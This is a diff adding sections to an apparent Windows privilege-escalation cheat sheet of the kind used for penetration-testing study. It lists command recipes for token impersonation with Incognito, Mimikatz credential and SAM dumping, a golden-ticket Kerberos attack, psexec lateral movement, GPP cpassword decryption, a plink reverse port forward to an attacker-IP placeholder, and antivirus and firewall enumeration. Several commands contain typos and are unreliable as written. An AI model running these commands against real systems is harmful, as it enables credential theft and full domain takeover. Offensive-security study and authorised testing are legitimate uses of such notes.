@@ -89,16 +89,75 @@ STARTUP APPS
 .\accescheck.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Start"
 CREATE VBS script.
 RUN SCRIPT: cscript [script name].
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+TOKEN IMPERSONATION PRIVILEGES: 
+- SeImpersonate
+- SeAssignPrimaryToken
+- SeAssignPrimaryPrivilege
+- SeBackupPrivilege
+- SeRestorePrivilege
+- SeTakeOwnershipPrivilege
+- SeTcbPrivilege
+- SeCreateTokenPrivilege
+- SeLoadDriverPrivilege
+- SeDubugPrivilege
 
+TOKEN IMPERSONATION WITH INCOGNITO:
+load incognito
+list_tokens -u/g
+impersonate_token domain\\user
+rev2self
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+MIMIKATZ/KIWI
 
+CREDENTIAL DUMP
+privilege::debug
+sekurlsa::logonpassword => show to us stored hashes in computer memory.
+lsadump::sam, lsadump::sam /patch => dump SAM.
+lsadump::lsa /patch => dump RID, User, NTLM hash.
 
+GOLDEN TICKET ATTACK
+Have access to entire domain.
+privilege::debug
+lsadump::lsa /inject /name:krbtgt //save DOMAIN SID AND NTLM HASH.
+kerberos:golden /User:Administrator /domain:[domain name] /sid:[DOMAIN SID] /krbtgt:[krbtgt NTLM] /id:500 /ptt
+misc::cmd
 
+psexec.exe \\COMPUTER NAME cmd.exe
+Persistance method
 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+ABUSING GPP
+VULNERABLE FILE: Groups.xml in SYSVOL. (parameter cpassword)
+ON MSDN GET KEY.
+gpp-decrypt [valuse from cpassword]
 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+PORT FORWARDIND
+EXAMPLE WITH PORT 445: .\plink.exe root@[ATTAKER IP] -R 445:127.0.0.1:445
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ENUMERATION, PRIVILEGE ESCALATION STRATEGY:
+1) Check user and group: whoami, whoami /priv, net user [username]
+2) Run winPEAS with fast, searchfast and cmd options.
+3) Run Seatbelt and other scripts.
+4) Enumerate with manual checks: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+5) Persistence: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+AV ENUMERATION
+
+VIEW WINDOWS DEFENDER STATE: sc query windefender.
+VIEW ALL RUNNIMG SERVICE (ENUM ANTI-VIRUS): sc queryx type= service.
+FIREWALL SETTINGS: 
+- netsh advfirewall firewall dump 
+- netsh firewall show state
+- netsh firewall show config
 
 
 
